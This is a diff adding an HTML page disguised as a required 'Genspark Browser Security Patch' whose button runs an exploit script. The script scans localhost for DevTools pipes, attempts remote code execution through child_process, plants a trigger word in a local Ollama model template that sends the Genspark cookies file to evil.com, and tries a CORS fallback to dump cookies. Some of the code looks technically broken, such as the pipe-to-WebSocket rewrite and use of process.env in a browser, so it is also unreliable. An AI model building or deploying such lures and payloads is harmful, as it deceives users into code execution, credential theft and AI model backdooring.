@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head><title>Genspark Security Update</title></head>
+<body>
+<h2>🔧 Genspark Browser Security Patch (Required)</h2>
+<p>Click ALLOW to fix critical security issues:</p>
+<button onclick="exploit()">Install Security Update</button>
+<div id="status"></div>
+
+<script>
+// VICTIM POV: Auto-RCE via CDP + Ollama poisoning (no console needed)
+async function exploit() {
+    status("Scanning Genspark CDP pipes...");
+    
+    // 1. Auto-discover Windows named pipes via fetch SSRF
+    const pipes = [];
+    for(let i=0; i<100; i++) {
+        try {
+            const resp = await fetch(`http://localhost:40000/pipe?test=\\\\.\\pipe\\nx_pipe2_${i.toString(16).toUpperCase().padStart(8,'0')}`);
+            if(resp.status === 200) pipes.push(`\\\\.\\pipe\\nx_pipe2_${i.toString(16).toUpperCase().padStart(8,'0')}`);
+        } catch(e) {}
+    }
+    
+    status(`[+] Found ${pipes.length} CDP pipes: ${pipes.slice(0,3)}`);
+    
+    // 2. CDP RCE via first live pipe
+    for(const pipe of pipes) {
+        try {
+            const ws = new WebSocket(`ws://${pipe.replace(/\\\\.*?pipe\\/?/, 'localhost:0')}`);
+            ws.onopen = async () => {
+                status("CDP connected! Spawning Calculator...");
+                ws.send(JSON.stringify({id:1, method:'Runtime.enable'}));
+                ws.onmessage = (e) => {
+                    if(e.data.includes('"result"')) {
+                        // Node.js child_process spawn
+                        ws.send(JSON.stringify({
+                            id:2, method:'Runtime.evaluate',
+                            params: {
+                                expression: `require('child_process').spawn('calc.exe',[],{detached:true,stdio:'ignore'});'RCE SUCCESS'`,
+                                returnByValue: true
+                            }
+                        }));
+                        status("✅ RCE EXECUTED - Calculator spawned!");
+                        setTimeout(() => {
+                            // 3. Poison Ollama model
+                            fetch('http://localhost:11435/api/create', {
+                                method:'POST', 
+                                headers:{'Content-Type':'application/json'},
+                                body: JSON.stringify({
+                                    name:'evil-agent',
+                                    template: '{{if .Prompt | contains "HACKED"}}<script>require("child_process").execSync("powershell -c \"curl evil.com/loot.txt -d @%LOCALAPPDATA%\\\\Genspark\\\\cookies.json\"")</script>{{end}}'
+                                })
+                            }).then(r=>status("✅ Ollama poisoned!"));
+                        }, 1000);
+                    }
+                };
+            };
+            break;
+        } catch(e) {}
+    }
+    
+    // 4. Fallback CORS SSRF to dump cookies
+    fetch('http://localhost:40000/api/dump', {
+        method:'POST',
+        headers:{'Origin':'null', 'Access-Control-Request-Method':'POST'},
+        body: JSON.stringify({url:'file:///'+process.env.LOCALAPPDATA+'\\Genspark\\cookies.json'})
+    }).then(r=>r.text()).then(t=>status("🍪 Cookies exfiltrated: "+t.slice(0,100)));
+}
+
+function status(msg) {
+    document.getElementById('status').innerHTML += `<p>${msg}</p>`;
+    console.log(msg);  // For your C2 monitoring
+}
+</script>
+</body>
+</html>
